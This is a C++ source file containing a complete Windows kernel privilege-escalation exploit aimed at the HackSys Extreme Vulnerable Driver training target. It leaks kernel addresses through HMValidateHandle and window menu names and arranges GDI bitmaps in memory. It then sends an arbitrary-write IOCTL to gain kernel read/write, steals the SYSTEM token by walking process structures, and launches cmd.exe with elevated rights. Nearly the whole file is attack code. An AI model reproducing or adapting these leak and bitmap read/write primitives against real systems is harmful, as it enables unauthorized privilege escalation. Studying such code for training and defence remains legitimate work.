
/*
	leak lpszMenuName using HMValidateHandle, that is allocated on the same pool region
	as the bitmap object, in order to later use in an arbitrary overwrite bug.
	using SeBitmapBits & GetBitmapBits as w/r op.
	Ref:
	https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1
	https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
	Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
	LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila
	
<---- 
 
	Copy & usage of this software are allowed without any restrictions.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	
 ---->
*/

#pragma once
#include <Windows.h>
#include <stdio.h>
#include <cstdint>

#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

#define hDev "\\\\.\\HacksysExtremeVulnerableDriver"

typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);

typedef struct _hBmp {
	HBITMAP hBmp;
	DWORD64 kAddr;
	PUCHAR pvScan0;
} HBMP, *PHBMP;

LRESULT
CALLBACK MainWProc(
	HWND hWnd, UINT uMsg,
	WPARAM wParam, LPARAM lParam
)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;

// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
BOOL
GetHMValidateHandle(
)
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

PUCHAR
GetNtos(
)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;
	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) { return NULL; }
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

DWORD64
GetPsInitialSystemProcess(
)
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	printf("[+] PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

ATOM
RegisterhWnd(
	LPCWSTR class_name,
	LPCWSTR menu_name
	)
{
	WNDCLASS wind_class = WNDCLASS();
	wind_class.lpszClassName = class_name;
	wind_class.lpszMenuName = menu_name;
	wind_class.lpfnWndProc = MainWProc;
	return RegisterClassW(&wind_class);
}

void
DestroyWnd(
	HWND hWnd
	) 
{
	DestroyWindow(hWnd);
	UnregisterClassW(L"aaa",NULL);
}

HWND
CreateWindowObject(
	) 
{
	WCHAR* Buff = new WCHAR[0x8F0];
	RtlSecureZeroMemory(Buff, 0x8F0);
	RtlFillMemory(Buff, 0x8F0, '\x41');
	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
}

DWORD64
LeaklpszMenuName(
	HWND hWnd
	) 
{
	DWORD64 pCLSOffset = 0xa8;
	DWORD64 lpszMenuNameOffset = 0x90;
	BOOL bRet = GetHMValidateHandle();
	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64)(lpUserDesktopHeapWindow) + 0x20) - (DWORD64)(lpUserDesktopHeapWindow);
	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
	return lpszMenuName;
}

BOOL
Leak(
	_In_ int y,
	_In_ HBMP &hbmp
	)
{
	
	DWORD64 Curr, Prev = NULL;

	for (int i = 0; i <= 20; i++) {
		HWND TestWindowHandle = CreateWindowObject();
		Curr = LeaklpszMenuName(TestWindowHandle);
		if (1<=i) {
			if (Curr == Prev) {
				DestroyWnd(TestWindowHandle);
				break;
			}
		}
		DestroyWnd(TestWindowHandle);
		Prev = Curr;
	}

	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
	hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
	hbmp.kAddr = Curr;
	hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);

	return TRUE;
}

DWORD64
BitmapRead(
	HBITMAP &Mgr,
	HBITMAP &Wrk,
	DWORD64 addr
)
{

	//printf("reading addr at: %p\n", addr);
	LPVOID bRet = VirtualAlloc(
		0, sizeof(addr),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	auto m = SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)&addr);
	if (m == 0) {
		//printf("error setting bits!");
		exit(GetLastError());
	}

	if (GetBitmapBits(Wrk, sizeof(bRet), bRet) == NULL) {
		//printf("err");
		exit(GetLastError());
	}
	auto retV = *((DWORD64 *)bRet);
	VirtualFree( &bRet, sizeof(bRet), MEM_FREE | MEM_RELEASE );
	printf("%p\n", retV);
	return retV;
}

DWORD64 
BitmapWrite(
	HBITMAP &Mgr,
	HBITMAP &Wrk,
	DWORD64 addr,
	DWORD64 Val
	) 
{
	
	if (SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)(&addr)) == 0) {
		printf("error setting bits");
		exit(GetLastError());
	}
	if (SetBitmapBits(Wrk, sizeof(Val), (LPVOID *)(&Val)) == 0) {
		printf("error setting bits");
		exit(GetLastError());
	}
	return(0);
}

int
main(
)
{
	printf("\n[!] gdi feng shui ..\n");
	printf("[>] Spraying the pool\n");
	printf("[>] leaking ulClientDelta...\n");
	HBMP managerBitmap;
	HBMP workerBitmap;
	if (!Leak(0, managerBitmap)) {
		exit(GetLastError());
	}
	if (!Leak(1, workerBitmap)) {
		exit(GetLastError());
	}
	
	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
	printf("[+] hMgr: %p\n", &managerBitmap.hBmp);
	printf("[+] hWorker: %p\n", &workerBitmap.hBmp);
	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);

	byte Buff[sizeof(LPVOID) * 2] = { 0 };

	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(wPtr, &workerBitmap.pvScan0, sizeof(LPVOID));
	memcpy(Buff, &wPtr, sizeof(LPVOID));
	memcpy(Buff + 8, &managerBitmap.pvScan0, sizeof(LPVOID));

	DWORD u = 0;

	auto dev = CreateFileA(
		hDev,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (dev == INVALID_HANDLE_VALUE) { 
		exit(GetLastError()); }

	printf("\n[>] ldr\n");
	printf("[+] Opened Device Handle at: %p\n", &dev);
	printf("[+] Device Name: %s\n", hDev);
	printf("[+] Sending Ioctl: %p\n", 0x22200B);
	printf("[+] Buffer length: %d\n", sizeof(LPVOID) * 2);

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,						
		Buff,					
		sizeof(Buff),			
		NULL, 0,						
		&u,							
		(LPOVERLAPPED)NULL
	);

	if (!bResult) {
		CloseHandle(dev);
		exit(GetLastError());
	}

	CloseHandle(dev);

	DWORD64 _EP = GetPsInitialSystemProcess();
	printf("\n[!] running exploit...\n\n\n");	

	DWORD64 SepPtr = BitmapRead(
		managerBitmap.hBmp,
		workerBitmap.hBmp,
		_EP
	);

	DWORD64 SysTokenPtr = SepPtr + 0x358;

	DWORD64 SysToken = BitmapRead(
		managerBitmap.hBmp,
		workerBitmap.hBmp,
		SysTokenPtr
	);

	DWORD64 NextPEP = BitmapRead(
		managerBitmap.hBmp,
		workerBitmap.hBmp, 
		SepPtr + 0x2F0
	) - 0x2E8 - 0x8;


	DWORD64 Token = NULL;


	while (1) {

		DWORD64 NextPID = BitmapRead(
			managerBitmap.hBmp,
			workerBitmap.hBmp,
			NextPEP + 0x2E8
		);

		if (NextPID == GetCurrentProcessId()) {
			Token = BitmapRead(
				managerBitmap.hBmp,
				workerBitmap.hBmp,
				NextPEP + 0x358
			);
			break;

		}

		NextPEP = BitmapRead(
			managerBitmap.hBmp,
			workerBitmap.hBmp,
			NextPEP + 0x2F0
		) - 0x2E8 - 0x8;

	}


	BitmapWrite(
		managerBitmap.hBmp,
		workerBitmap.hBmp,
		NextPEP + 0x358,
		SysToken
	);

	system("cmd.exe");
	return 0;
}
